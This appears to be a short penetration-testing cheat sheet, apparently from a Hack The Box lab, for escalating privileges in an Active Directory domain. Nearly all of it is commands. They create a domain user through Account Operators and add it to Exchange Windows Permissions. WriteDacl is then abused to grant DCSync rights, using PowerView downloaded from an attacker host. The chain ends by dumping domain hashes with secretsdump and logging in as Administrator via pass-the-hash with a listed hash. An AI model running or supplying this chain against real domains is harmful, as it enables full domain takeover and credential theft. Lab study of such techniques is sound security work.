# Groups
## Account Operators
The Account Operators group has privileges to create and manage domain user accounts, including adding users to certain domain groups (excluding highly privileged groups such as Domain Admins).
Create user:
```
net user shaiiko shaiiko123! /add /domain
```
Add to group:
```
net group "Exchange Windows Permissions" shaiiko /add /domain
# or
Add-DomainGroupMember -Identity "NombreDelGrupo" -Members shaiiko -Credential $Cred
```
Veriying:
```
whoami /groups
net user shaiiko /domain
```

## Exchange Windows Permissions
### WriteDacl
The Exchange Windows Permissions group has WriteDACL rights over the domain object.
This allows its members to modify Access Control Lists (ACLs) on the domain, including granting DCSync privileges to arbitrary users.
```
$SecPassword = ConvertTo-SecureString 'shaiiko123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\shaiiko', $SecPassword)
iwr http://10.10.14.177/PowerView.ps1 -OutFile PowerView.ps1
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity shaiiko -Rights DCSync
```
Dumping Domain Hashes (DCSync)
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py htb.local/shaiiko@10.129.8.25
```

PassTheHash:
```
evil-winrm -i 10.129.8.25 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```
